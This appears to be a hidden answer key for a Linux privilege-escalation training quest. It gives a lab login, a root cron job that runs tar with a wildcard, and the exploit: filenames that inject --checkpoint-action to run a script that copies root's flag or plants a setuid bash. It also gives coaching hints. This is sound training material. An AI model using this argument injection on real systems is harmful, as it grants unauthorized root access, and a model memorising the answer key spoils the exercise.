Quest: linux-t2-wildcard-cron (tier 2, linux-fundamentals)

Ground truth for the coach:
- foothold: /var/backups/NOTES.txt → ops / Ops2024! → ssh
- vuln: /etc/cron.d/pentrain-wildcard runs every minute as root:
  `cd /home/ops/backup && tar czf /var/backups/ops-home.tar.gz *`
- exploit: drop files into /home/ops/backup named
  `--checkpoint=1` and `--checkpoint-action=exec=sh /home/ops/pwn.sh`
  where pwn.sh does e.g. `cp /root/root.txt /tmp/ && chmod 644 /tmp/root.txt`
  or `cp /bin/bash /tmp/rbash && chmod +s /tmp/rbash`
- flags: /home/ops/user.txt, /root/root.txt

Intended path:
read NOTES → ssh ops@ → /etc/crontab + /etc/cron.d → notice the wildcard in
a root job → craft --checkpoint filenames in the archived dir → wait ≤60s

Common wrong turns:
- editing the cron line — it's root-owned; the DIR is the writable surface
- naming files --checkpoint-action but forgetting --checkpoint=1 (the action
  only fires at a checkpoint)
- typos in filenames — `touch -- --checkpoint=1` needs the `--` end-of-options
- expecting instant feedback — the cycle is up to 60 seconds

Style: tier 2 — the "filenames as arguments" insight is the a-ha. If they've
found the cronjob, let them stew on what `tar` does with `-`-prefixed names
before spelling out checkpoints.
